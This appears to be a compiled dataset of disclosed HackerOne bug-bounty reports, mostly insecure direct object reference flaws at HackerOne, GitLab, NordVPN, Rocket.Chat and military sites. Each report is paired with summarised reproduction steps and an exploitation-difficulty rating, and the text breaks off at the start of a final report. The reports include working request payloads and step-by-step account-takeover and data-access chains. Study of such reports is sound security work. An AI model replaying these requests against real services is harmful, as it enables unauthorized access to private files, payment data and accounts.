Hackerone provides a form for reporting vulnerabilities to various programs. where the form supports uploading files & previews (images or videos) but is not allowed to use file ids belonging to other accounts. but with the sumary report feature I as a hacker can reveal files belonging to other users just changing the id. this is very severe.
Description:
I have tried to call files belonging to other accounts through the submit report, edit report form but it doesn't work it always gets the response "was_successful":false,. but fortunately I can find another endpoint that is able to read files belonging to other accounts, namely in the sumary report feature.
Steps To Reproduce
If you look at the video I attached, there I made the scenario "failed to read other account files" & "successfully read other account files" as for the steps as follows:
note : left victim right attacker
the attacker creates a report either draft or existing, then creates a Hacker summary
then edit the summary and give the file to.
intercept with intercept change the attacker file id to the victim file id
boom file read in markdown preview.
{F3155289}
POC
I don't know, uploading large files takes too long in attacth, I just put the poc via yt. : https://████ (private video)
or in gdrive, if yt can't be seen yet : https://███████
Optional: Supporting Material/References (Screenshots)
raw text in video :
Code 320 Bytes
1attachment leaked via add sumary report :
2
3victim file id : 
43155239
5
6I WILL CHANGE F3155244 TO 3155239
7ATTACKER file : 
8
93155241
103155242
11"was_successful":true, (IF FILE FROM ATTACKER) I WILL CHANGE TO VICTIM FILE
12"was_successful":false, WILL FALSE 
13
14trying leak via content : false positive
15leak via sumary : successful
endpoint affected (attachment_ids)
Code 908 Bytes
1PUT /reports/████/summaries/███████ HTTP/2
2Host: hackerone.com
3.....all header ...
4Content-Length: 908
5Origin: https://hackerone.com
6Sec-Fetch-Dest: empty
7Sec-Fetch-Mode: cors
8Sec-Fetch-Site: same-origin
9Te: trailers
10
11{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-03-29T11:27:50.077Z","url":"https://hackerone.com/██████████","hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-█████.png","medium":"/assets/avatars/default-███████.png","xtralarge":"/assets/avatars/default-███████.png"}},"can_view?":true,"can_create?":true,"attachments":[],"action_type":"publish","attachment_ids":[
123155239]}
Impact
This is very bad especially the id form is only numeric in order. I can just add all the file ids of the hackerone account. I can see other people's pocs if it's a video.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to disclose files belonging to other users by exploiting the summary report feature. By manipulating the file ID in the request, the attacker can access and preview files that should be restricted to other accounts.

Steps to Reproduce:
1. Attacker creates a report (draft or existing) and generates a Hacker summary.
2. Attacker edits the summary and attaches a file, then intercepts the request to change the file ID to a victim's file ID.
3. The victim's file is successfully displayed in the markdown preview, bypassing access controls.
Exploitation Difficulty:
The attack involves understanding the file attachment mechanism and identifying a bypass in the summary report feature. While the steps are straightforward, the discovery of the vulnerable endpoint (summary report) and the manipulation of file IDs require some exploration and testing.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2487889: Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint
================================================================================
RAW DESCRIPTION:

Hi H1 i hope you are Doing Well Today :)
Explaining
I Found that any private reports can be accessed by sending a POST request to the /bugs.json endpoint. This vulnerable endpoint requires organization_id, which takes the organization's ID as a value. It also requires text_query, which is used to search for report IDs. within this org , Now you can append the example organization ID mentioned on the policy page, 58579. and For the text_query, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization
Step To Reproduce
1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is
Code 636 Bytes
1
2POST /bugs.json HTTP/2
3Host: hackerone.com
4Cookie:  __Host-session=Your-Session-Here
5X-Csrf-Token: Your-Csrf-Here
6Content-Type: application/x-www-form-urlencoded; charset=UTF-8
7X-Requested-With: XMLHttpRequest
8Te: trailers
9Content-Length: 390
10
11text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true
12
Poc Video
█████████
Impact
idor lead to view private reports title,url,id,state,substate,severity_rating,readable_substate,created_at,submitted_at,reporter_name



================================================================================
Vulnerability Description:
An Insecure Direct Object Reference (IDOR) vulnerability allows unauthorized access to private report details by manipulating the /bugs.json endpoint with a simple POST request containing a known organization ID and a single-digit text query.

Steps to Reproduce:
1. Send a POST request to the /bugs.json endpoint with the required parameters: text_query (a single digit) and organization_id (e.g., 58579).
2. Analyze the response to view private report details such as title, URL, ID, state, substate, severity_rating, readable_substate, created_at, submitted_at, and reporter_name.
Exploitation Difficulty:
The vulnerability involves straightforward manipulation of a single endpoint with predictable parameters (organization_id and text_query). The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2587953: Email Takeover leads to permanent account deletion
================================================================================
RAW DESCRIPTION:

Hii Triager,
NOTE: Just to clarify, I reported a similar issue yesterday, but it was on a different endpoint. In this report, the vulnerable domain is the same, but the endpoint is different.
I found that an attacker can change their email address to the victim's(existing user) email, which then leads to permanent account deletion of the victim's account.
User-A: Attacker
User-B: Victim
Both User-A & User-B are registered user & have their separate accounts on https://www.██████████/852585B6003EBA25/CreateAccount.html
Impact
Possible Account Takeover (Probably)
Permanent Account Deletion
Improper Authentication on change email functionality.
System Host(s)
www.█████████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
1 - Login to Attacker's account, User-A (attacker@email.com)
2 - Login to Victim's Account, User-B (victim@email.com)
3 - In the Attacker's account, Navigate to the Change Your Email Address section.
4- Change the Attacker's email to victim@email.com. You can successfully take over the victim's email. (probably victim account)
5 - Now, Try to login as victim account(with victim email & password) , Application will Return Invalid Credentials
This is the indication of an Email Takeover of the victim's account
6 - Now, Navigate to the Attacker's account & change the email back to attacker@email.com
7 - Navigate to the Registration page, Enter the victim's email victim@email.com & click Check Availability. You'll see that the victim's email is deleted from the DB & available for a new account.
This is the indication of Permanent deletion of the Victim's account.
Video PoC
████
Suggested Mitigation/Remediation Actions
Set proper authentication on the Update Profile functionality.



================================================================================
Vulnerability Description:
An attacker can change their email to match a victim's email, causing the victim's account to be permanently deleted due to improper authentication in the email change functionality.

Steps to Reproduce:
1. Login to Attacker's account (attacker@email.com)
2. Login to Victim's account (victim@email.com)
3. Navigate to 'Change Your Email Address' in Attacker's account
4. Change Attacker's email to victim@email.com (victim's email)
5. Attempt to log in as victim - observe 'Invalid Credentials' error
6. Change Attacker's email back to attacker@email.com
7. Check victim@email.com availability - observe it's now available
Exploitation Difficulty:
The attack involves straightforward steps of email manipulation without requiring complex interactions or state manipulation. The vulnerability stems from a basic authentication flaw in email change functionality, which is a common security issue.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/265284: 'cnvID' parameter vulnerable to Insecure Direct Object References
================================================================================
RAW DESCRIPTION:

Installation Information
IIS 8, PHP 5.5, Concrete5 (5.7.5.7) [Default install]
### Issue POC
An unauthenticated user can enumerate comments from all blog posts by POSTing requests to /index.php/tools/required/conversations/view_ajax with incremental 'cnvID' integers.
<image_0>
<image_1>
<image_2>
<image_3>
Remediation
Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename):
Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references.
Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.
References
OWASP Top 10 2010-A4-Insecure Direct Object References
Also, crayons



================================================================================
Vulnerability Description:
An unauthenticated user can enumerate comments from all blog posts by incrementing the 'cnvID' parameter in POST requests to a specific endpoint, exploiting Insecure Direct Object References (IDOR).

Steps to Reproduce:
1. Send a POST request to '/index.php/tools/required/conversations/view_ajax' with an incremental 'cnvID' parameter.
2. Observe the response containing comments from blog posts not owned by the user.
Exploitation Difficulty:
The vulnerability involves a straightforward manipulation of a single parameter ('cnvID') without requiring complex interactions or understanding of multiple components. The attack is simple and does not involve novel or uncommon logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/388554: ████ █████ exposes highly sensitive information to public
================================================================================
RAW DESCRIPTION:

Summary:
www.██████ is a system used by ██████ for vendors to upload details of their technology for review by ███. Due to an insecure direct object reference vulnerability, all vendor uploads are accessible to the public, without authentication. This includes Unclass//FOUO documents, documents labeled ITAR RESTRICTED / EXPORT CONTROLLED DATA, and confidential / proprietary data of the respective vendors. These documents include detailed specifications on military technology, including weapons systems, surveillance systems, missiles and ballistics, and other confidential technology.
For instance, several documents contained had labeled criminal penalties for foreign export:
Code 377 Bytes
1WARNING – This document contains technical data whose export is restricted by the Arms Export Control Act (Title 22, U.S.C., Sec 2751 et seq.) or the Export Administration Act of 1979, (Title 50, U.S.C., App. 2401 et seq.), as amended. Violations of these export laws are subject to severe criminal penalties. Disseminate in accordance with provisions of DoD Directive 5230.25.
Although I did not identify any classified documents, there is a possibility that classified information is also uploaded here.
Step-by-step Reproduction Instructions
Visit https://www.███/api/document/x, replacing x with any numerical ID. These go into the low tens of thousands.
Observe that the document will be downloaded, provided it exists.
Observe that this can be repeated for tens of thousands of documents.
Some screenshots of evidence of sensitive information attached.
Impact
This exposes highly sensitive information of both the DoD (ITAR restricted) and proprietary/confidential company information.



================================================================================
Vulnerability Description:
The vulnerability involves an insecure direct object reference (IDOR) in a system used by ██████, allowing public access to sensitive vendor-uploaded documents without authentication. These documents include Unclass//FOUO, ITAR RESTRICTED, and proprietary data, exposing detailed military technology specifications and other confidential information.

Steps to Reproduce:
1. Visit https://www.███/api/document/x, replacing x with any numerical ID (e.g., 1, 2, 3, etc.).
2. Download and inspect the document, which will be accessible without authentication.
Exploitation Difficulty:
The attack is straightforward, involving only a simple IDOR vulnerability with no complex interactions, state manipulations, or novel logic. The tester merely needed to increment numerical IDs in the URL to access documents.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/395246: ███████ Site Exposes █████████ forms
================================================================================
RAW DESCRIPTION:

Summary
The █████ site (https://██████.mil/) allows authenticated users to submit ██████ e-forms. Due to a vulnerability in this system, any authenticated user can access the full █████████ e-form of any other user.
Steps to reproduce
Intercept an authenticated request on █████████ containing an Authorization header.
Replace the url with █████████. Observe that the id in the url can be incremented/decremented to view recently generated OMPFs.
Upon submitting the request, the user's full ███████ form JSON response will be sent.
Impact
Access to ████ is possible through either a Department of Defense Self-Service logon, CAC card, or █████████password. Thus, a compromise of a single account on any of these systems would allow for unrestricted access to all ████ forms.
The ████ form includes the following
PII such as SSN, DoB, addresses, etc
Personal remarks
Other fields related to security clearances, education, maritial status, etc



================================================================================
Vulnerability Description:
The vulnerability allows any authenticated user to access the full e-form of any other user by manipulating the ID parameter in the URL, leading to unauthorized access to sensitive personal information.

Steps to Reproduce:
1. Intercept an authenticated request containing an Authorization header.
2. Modify the URL to increment/decrement the ID parameter to access other users' forms.
Exploitation Difficulty:
The attack involves simple manipulation of the ID parameter in the URL, which is a common and straightforward technique. There are no complex interactions or states involved.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/429000: Access to all █████████ files, including CAC authentication bypass
================================================================================
RAW DESCRIPTION:

Summary:
Due to an Insecure Direct Object Reference (IDOR) in adding recipients to a shared package on ██████████, an unauthenticated attacker can access all files uploaded to ████. As described on ██████████ website, this includes documents with classifications up to FOUO, including PII / PHI Privacy Act data, and documents classified FOUO//CLOSE HOLD, FOUO//SENSITIVE, and FOUO//LIMITED DISTRIBUTION DOCUMENT.
Additionally, █████ enforces CAC pickup requirements to require users to first authorize via CAC. This too, can be bypassed, allowing an attacker to download any file sent over ████.
Note that in addition to this vulnerability, other IDORs exist in sensitive areas, such as confirming email addresses, allowing an attacker to pretend to send documents from any email address.
Impact
Based on analysis of file ids, over 2000 documents are uploaded per hour to ███. When combined with a ██████, this exposes over 500,000 recent documents and new documents that are sent every hour. Additionally, as metadata for historical documents is not purged, this also includes details such as sender names/emails, file descriptions, and share dates for over 15 million past documents.
Step-by-step Reproduction Instructions
Visit████/Default.aspx and proceed to send a file to yourself.
Click through the verification email and verify the file.
Log in to the Package Status page at███/StatusLogIn.aspx?PackageID=x using the provided password.
Intercept the request to add a new recipient via the recipients list, entering your email address as the email to add. This is a POST request to POST /████████/Status.aspx?ID=x.
Modify the ID parameter to any other number, e.g. decrement the number by 1.
Observe that the package will be sent to your email, which can then be downloaded using the provided password.
Repeat with any numeric ID to download hundreds of thousands of files.
To bypass CAC authentication:
A user can elect to require CAC authentication when downloading a file. This can be bypassed via the normal file download flow.
Visit█████/███?id=15745307 (the initial file ID here does not matter).
Enter the password emailed for the file that requires CAC authentication.
Intercept the request to submit the form. Replace the id parameter in the url with the id of the file with CAC authentication.
Observe that the file's information will be displayed and can be downloaded.
Suggested Mitigation/Remediation Actions
Ensure that a user can only modify their own packages
Ensure that a file cannot be downloaded without CAC authentication
Ensure that a user can only verify their own packages.
Impact
.



================================================================================
Vulnerability Description:
This vulnerability involves an Insecure Direct Object Reference (IDOR) in a file-sharing system, allowing unauthenticated attackers to access sensitive documents (including FOUO-classified files) and bypass CAC authentication. Attackers can manipulate package IDs to access files not intended for them and bypass CAC requirements by intercepting and modifying requests.

Steps to Reproduce:
1. Visit ████/Default.aspx and send a file to yourself.
2. Click through the verification email and verify the file.
3. Log in to the Package Status page at ███/StatusLogIn.aspx?PackageID=x using the provided password.
4. Intercept the request to add a new recipient via the recipients list, entering your email address as the email to add (POST request to POST /████████/Status.aspx?ID=x).
5. Modify the ID parameter to any other number (e.g., decrement by 1).
6. Observe that the package is sent to your email and can be downloaded using the provided password.
7. Repeat with any numeric ID to download other files.
8. To bypass CAC authentication: Visit █████/███?id=15745307 (initial file ID does not matter).
9. Enter the password emailed for the file that requires CAC authentication.
10. Intercept the request to submit the form and replace the id parameter in the URL with the ID of a file requiring CAC authentication.
11. Observe that the file's information is displayed and can be downloaded without CAC authentication.
Exploitation Difficulty:
The attack involves multiple components (IDOR, CAC bypass, request interception) and requires understanding of the application's state and request flow. However, the steps are methodical and do not involve highly novel or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/447930: Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details
================================================================================
RAW DESCRIPTION:

It's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.
Proof of concept
In order to reproduce the vulnerability, follow the steps below.
consider the following node ID: Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==
decode the ID (base64), which will look something like gid://hackerone/EmbeddedSubmissionForm/9
change the primary key identifier, and base64 encode it
execute the following GraphQL query:
Request
Code 139 Bytes
1query {
2  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
3    ... on EmbeddedSubmissionForm {
4      uuid
5    }
6  }
7}
Response
Code 132 Bytes
1{
2  "data": {
3    "node": {
4      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
5      "uuid": "████"
6    }
7  }
8}
take the UUID, and append ?embedded_submission_form_uuid=:uuid to the GraphQL request
submit the following query to obtain the program information:
Request
Code 263 Bytes
1POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
2Host: hackerone.com
3...
4
5{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
Response
Code 220 Bytes
1{
2  "data": {
3    "node": {
4      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
5      "uuid": "███",
6      "team": {
7        "handle": "██████████",
8        "policy": "The policy."
9      }
10    }
11  }
12}
Impact
Any unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.
There are essentially two vulnerabilities here: the ability to directly query the EmbeddedSubmissionForm object and the fact that by specifying a UUID, the Team object exposes too much information.



================================================================================
Vulnerability Description:
The vulnerability allows unauthenticated enumeration of embedded submission form UUIDs via HackerOne's GraphQL node interface, exposing sensitive private program details (policy, bounty table, etc.) that should only be accessible to invited reporters. The issue stems from two flaws: (1) direct querying of EmbeddedSubmissionForm objects via incremental primary keys, and (2) excessive data exposure when a valid UUID is provided.

Steps to Reproduce:
1. Decode a base64 node ID to reveal the internal structure (e.g., gid://hackerone/EmbeddedSubmissionForm/9)
2. Modify the primary key in the decoded ID, re-encode it in base64, and use it in a GraphQL query to fetch the UUID
3. Use the obtained UUID in a subsequent GraphQL request to access private program details (team handle, policy, etc.)
Exploitation Difficulty:
The attack requires understanding of GraphQL's node interface, UUID manipulation, and chaining two distinct vulnerabilities (ID enumeration + excessive data exposure). While the components are documented (base64, GraphQL), their exploitation requires non-obvious interactions (primary key inference, UUID reuse).

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/674195: Stealing data from customers.gitlab.com without user interaction
================================================================================
RAW DESCRIPTION:

Summary
An attacker can link her own customers.gitlab.com account to the one of the victim, and these give access to 3 different vulnerabilities:
destroying subscriptions of the victim
buying new subscriptions using victim credit card for its own groups
some (minor) information disclosure about what is over Gitlab.com
Steps to reproduce
The attacker registers herself on customers.gitlab.com, logging in using her Gitlab.com account.
After that, she updates her customers.gitlab.com account and link it to the victim's Gitlab account through the victim's account userId (they are sequential and they are not secret, so no problem retrieving it).
This update is quite easy, attacker needs only to copy how "Update Account" HTTP request, and change the customer%5Buid%5D field, like this:
Code 743 Bytes
1await fetch("https://customers.gitlab.com/customers", {
2    "credentials": "include",
3    "referrer": "https://customers.gitlab.com/customers/edit",
4    "body": "utf8=%E2%9C%93&_method=patch&authenticity_token=YOquJGc9evhkHMfLOZljuw9OcDn0gtJw8AHPb0yVhyml9q1TISGHa%2FK57DAlg8jB%2BEqvJYYob26BRgx4sZbRzg%3D%3D&customer%5Bfirst_name%5D=Riccardo&customer%5Blast_name%5D=Padovani&customer%5Baddress_1%5D=&customer%5Baddress_2%5D=&customer%5Bcity%5D=Munich&customer%5Bzip_code%5D=81479&customer%5Bcountry%5D=DEU&customer%5Bstate%5D=BY&customer%5Bvat_code%5D=&customer%5Bcompany%5D=Riccardo+Padovani&customer%5Bemail%5D=hackerone1%40rpadovani.com&customer%5Bprovider%5D=gitlab&customer%5Buid%5D=VICTIM_ID",
5    "method": "POST",
6    "mode": "cors"
7});
The backend will validate the input, and now the two accounts are somehow linked.
Impact
When the victim will login again, all his subscriptions will be lost
If the victim updates his data after the attack, the attacker account will be updated with the same data, INCLUDING CREDIT CARD. The attacker can now purchase plans using victim's credit card
Attacker has also a list of teams victim is owner, when she purchases a new plan.
If attacker wants to purchase a plan for her own group, she can nominate victim owner, so now attacker's group will be in the dropdown, buy the plan, remove the victim.
Examples
I attached a video with all these attacks, sorry but it is a bit messy.
On the left there is victim's browser, on the right attacker's browser. When it appears a console, is for the attacker's browser. The attacker's is in a private session, so it is completely separated from the victim.
0:00-0:10: we see victim has a subscription, and attacker no. They also have different data
0:10-0:40: attacker does a first attack, changing both uid and email, and it doesn't work
0:40-1:10: attacker does a proper attack, changing only uid. Notice how bottom right the Gitlab.com account changes
1:10-1:30: nothing else has changed
1:30-1:50: victim does log out and login again and ALL DATA AND SUBSCRIPTIONS ARE GONE
You can skip to
2:30-2:40: victim updates his data, also attacker's data are updated accordingly
2:40-4:30: victim buys a new subscription
4:30-5:00: attackers can use victim's credit card
What is the current bug behavior?
customers.gitlab.com user can update its link to Gitlab.com without any verification
End notes:
I'd like you also reset my customers.gitlab.com accounts, now they are all a bit a mess.
Also, while testing I think I associated my customers.gitlab.com account with Gitlab's account with UID 1 due an error in copy-paste. I removed immediately the link, but maybe you should check if the link is indeed being delete, and say sorry on my behalf to Sid!
I noticed that in the video it appears my CC data - so please do not disclose the issue, also on the Gitlab.com issue tracker, without removing the video first, please!
Impact
Attackers can steal victim's data, including last 4 numbers of CC, and use victim's CC to buy subscriptions



================================================================================
Vulnerability Description:
An attacker can link their own customers.gitlab.com account to a victim's account by manipulating the user ID in the account update request. This allows the attacker to access and modify the victim's subscriptions, use their credit card for purchases, and disclose minor information about the victim's GitLab.com account.

Steps to Reproduce:
1. Register an attacker account on customers.gitlab.com using a GitLab.com account.
2. Update the attacker's account by changing the 'customer%5Buid%5D' field to the victim's user ID in the 'Update Account' HTTP request.
3. Victim logs in again, causing loss of subscriptions and potential data synchronization.
4. Attacker can now use victim's credit card to purchase subscriptions or access victim's data.
Exploitation Difficulty:
The vulnerability involves manipulating the account linking mechanism without verification, which is a straightforward process once the sequential and non-secret nature of user IDs is understood. The attack does not require complex interactions or novel logic, making it relatively easy to discover.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/741683: idor on upload profile functionality 
================================================================================
RAW DESCRIPTION:

Vulnerable URL: https://██████████/███████ID/#Common/EditOne/Person/{account_id}
steps to reproduce:
1).browse the image and click on the upload button
2).capture this request in burp suite
3). change the value 'personId' parameter to account2 account_id
(please see screenshot1)
4).then goes to account2, then you will see the uploaded image is successfully goes to the approved tab
please see video attach below you will understand completely
Impact
an attacker is able to change profile image of any user



================================================================================
Vulnerability Description:
This is an Insecure Direct Object Reference (IDOR) vulnerability that allows an attacker to change the profile image of any user by manipulating the 'personId' parameter in the upload request.

Steps to Reproduce:
1. Browse the image and click on the upload button.
2. Capture the request in Burp Suite.
3. Change the 'personId' parameter to another account's ID.
4. Verify the uploaded image appears in the target account's approved tab.
Exploitation Difficulty:
The vulnerability involves a straightforward parameter manipulation in a single request. The attack does not require understanding complex application states or novel logic, nor does it involve multiple components or subtle interactions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/751577: IDOR allow access to payments data of any user
================================================================================
RAW DESCRIPTION:

simple send this POST request (no need any auth):
POST /api/v1/orders HTTP/1.1 Host: join.nordvpn.com Accept: application/json Accept-Language: en-US,en;q=0.5 Content-Type: application/json Content-Length: 179 DNT: 1 Connection: close
{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}
will respond:
{"id":42615458,"user_id":20027039,"confirmation":{"id":23093398,"created_at":"2019-12-04 17:01:35","updated_at":"2019-12-04 17:01:35","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"█████\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49476958\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/264cae0b89e44a7bd263431b68d1122d\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=1\",\"want_shipping\":0}}"}}
change user_id to 23093782 and you will get:
{"id":42616121,"user_id":89495166,"confirmation":{"id":23093782,"created_at":"2019-12-04 17:16:14","updated_at":"2019-12-04 17:16:14","type":"redirect","value":"https:\/\/pay.gocardless.com\/flow\/RE000W16X7XH4JCXJZ623MS6H7W316N3"}}
change id to 89495247 (my test account) and you will get:
{"id":42616142,"user_id":89495247,"confirmation":{"id":23093800,"created_at":"2019-12-04 17:16:48","updated_at":"2019-12-04 17:16:48","type":"redirect_post","value":"{\"url\":\"https:\\\/\\\/www.coinpayments.net\\\/index.php\",\"parameters\":{\"cmd\":\"_pay\",\"reset\":1,\"email\":\"hackerhacker@test.pl\",\"merchant\":\"e64a9629f9a68cdeab5d0edd21b068d3\",\"currency\":\"USD\",\"amountf\":125.64,\"item_name\":\"VPN order\",\"invoice\":\"49478089\",\"success_url\":\"https:\\\/\\\/join.nordvpn.com\\\/payments\\\/callback\\\/4513bd083a97e1b5c23c69096d89ac80\",\"cancel_url\":\"https:\\\/\\\/join.nordvpn.com\\\/order\\\/error\\\/?error_alert=payment&eu=0\",\"want_shipping\":0}}"}}
Just letting You know that i submited this bug today on support@nordvpn.com from lewiatan~@ cause i wasn't able to report it via hackerone.
Impact
leak sensitive customer data



================================================================================
Vulnerability Description:
The vulnerability is an Insecure Direct Object Reference (IDOR) that allows unauthorized access to payment data of any user by simply changing the `user_id` parameter in a POST request to the `/api/v1/orders` endpoint. The endpoint does not perform proper authorization checks, enabling an attacker to view sensitive payment information of other users.

Steps to Reproduce:
1. Send a POST request to `/api/v1/orders` with a JSON payload containing a `user_id` field.
2. Change the `user_id` value in the request to access payment data of other users.
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it only requires modifying a single parameter in a request. There are no complex interactions or states involved, and the attack does not require any novel or uncommon logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/767770: Private objects exposed through project import
================================================================================
RAW DESCRIPTION:

Summary
This is a bypass of https://hackerone.com/reports/743953 , the current fix is blocking all "_ids" attributes. However an attacker could still set attributes like issue_ids by indrectly settings the field within the attributes field it self:
Code 134 Bytes
1# project.json
2    "attributes": {
3        "issue_ids": [ 29279725 ],
4        "description": "Set from attributes[description]"
5    },
Steps to reproduce
Import the attached tarball.
Check issues tab
The other parts of the report are mostly same as those I mentioned in https://hackerone.com/reports/743953 , I decide to write a new report considering the impact to gitlab.com.
Impact
With this ability to modify relations between objects, an attacker could end up with accessing random resources of other users by traversing the incremental ID space.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to modify relations between objects in GitLab by exploiting a bypass in the project import functionality. Despite a previous fix that blocked '_ids' attributes, the attacker can still set fields like 'issue_ids' indirectly through the 'attributes' field, potentially accessing random resources of other users by traversing the incremental ID space.

Steps to Reproduce:
1. Create a project.json file with an 'attributes' field containing 'issue_ids' and other fields.
2. Import the project.json file into GitLab and check the issues tab to see the unauthorized changes.
Exploitation Difficulty:
The vulnerability involves understanding the previous fix and finding a subtle bypass by manipulating the 'attributes' field. It requires knowledge of how GitLab handles project imports and object relations, but the attack itself is straightforward once the bypass method is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/819807: Missing ownership check on remote wipe endpoint
================================================================================
RAW DESCRIPTION:

On settings/user/security
You can mark a device for wipe out that does not belong to you.
Steps:
Create 2 accounts one for the hacker and one for the victim
On both accounts add devices with different names
On the hacker account, while intercepting with burpsuite, select the option to wipe out a device
Forward with burpsuite and in the url that looks like settings/personal/authtokens/wipe/{data-id}, change the data-id to the id of the device of the victim
Stop intercepting or forward again and the device of the victim will be marked for wipe out.
Impact
Attacker can wipe out the device of another user by using the device ID



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to mark another user's device for remote wipe by manipulating the device ID in the wipe endpoint URL. This occurs due to a missing ownership check on the endpoint, enabling unauthorized access to device wipe functionality.

Steps to Reproduce:
1. Create two accounts: one for the attacker (hacker) and one for the victim.
2. Add devices with different names to both accounts.
3. On the hacker account, intercept the request to wipe a device using Burp Suite.
4. Modify the URL in the intercepted request to target the victim's device ID (e.g., change 'settings/personal/authtokens/wipe/{data-id}' to the victim's device ID).
5. Forward the modified request to mark the victim's device for wipe.
Exploitation Difficulty:
The attack involves intercepting and modifying a request, which is a common technique, and the vulnerability stems from a straightforward missing ownership check. The steps are linear and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/842625: account takeover on 3.0.1 version
================================================================================
RAW DESCRIPTION:

I find user reset password hash info and other security info on "/api/v1/users.info"

note : I login on rocketchat with ldap account (my role : user)

note: in request "https://target/api/v1/users.info?username=[x]" you should change usrname to userId
1- please login with user ldap account (role user)

2- send a request to https://target/api/v1/users.list and copy _id value

3- send a request to https://target/api/v1/users.info?userId=[userId] and copy email value (in response you can see important security information )

4- logout and click "forget your password" link on https://target/home and send an email to above email address that you copied

4- login with Your account and send a request to https://target/api/v1/users.list and search the same email in response and copy _id value

5- send a request to https://target/api/v1/users.info?userId=[userId] and copy reset hash value

6- logout your account and send a request to https://target/reset-password/[reset_hash]

7- set new password

8- login and enjoy
Impact
account takeover



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to perform an account takeover by exploiting the exposure of sensitive security information (such as password reset hashes) in the API response of Rocket.Chat's /api/v1/users.info endpoint. By leveraging this information, an attacker can reset the password of any user and gain unauthorized access to their account.

Steps to Reproduce:
1. Login with a user LDAP account (role: user)
2. Send a request to https://target/api/v1/users.list and copy the _id value
3. Send a request to https://target/api/v1/users.info?userId=[userId] and copy the email value
4. Logout and click 'forget your password' link on https://target/home and send an email to the copied email address
5. Login with your account and send a request to https://target/api/v1/users.list to search for the same email and copy the _id value
6. Send a request to https://target/api/v1/users.info?userId=[userId] and copy the reset hash value
7. Logout and send a request to https://target/reset-password/[reset_hash]
8. Set a new password and login to take over the account
Exploitation Difficulty:
The attack involves multiple steps, including manipulating API endpoints to extract sensitive information and using it to reset passwords. However, the steps are straightforward and do not require deep understanding of complex interactions or novel logic. The vulnerability stems from improper exposure of security-sensitive data in API responses, which is a common oversight.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/847452: Full Account Take-Over of ████████ Members via IDOR
================================================================================
RAW DESCRIPTION:

Summary
